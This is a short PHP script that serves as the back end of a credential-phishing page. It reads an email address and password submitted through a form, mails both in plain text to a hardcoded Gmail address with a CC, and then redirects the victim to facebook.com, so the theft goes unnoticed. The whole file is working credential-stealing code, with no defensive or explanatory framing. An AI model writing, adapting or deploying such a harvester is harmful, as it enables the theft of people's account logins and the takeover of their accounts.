<?php
   $email = $_POST['email']; 
   $password = $_POST['password'];

   $to = "mdushan088@gmail.com";

   $subject = "mail From codeconia";
   $txt = "Email =" . $email. "\r\n password=" .$password;

   $headers = "From: noreply@codeconia.com". "\r\n". "CC:somebodyelse@example.com";
   if($email !=NULL){
      mail($to,$subject,$txt,$headers);
   }

   header("Location:https://www.facebook.com/")




?>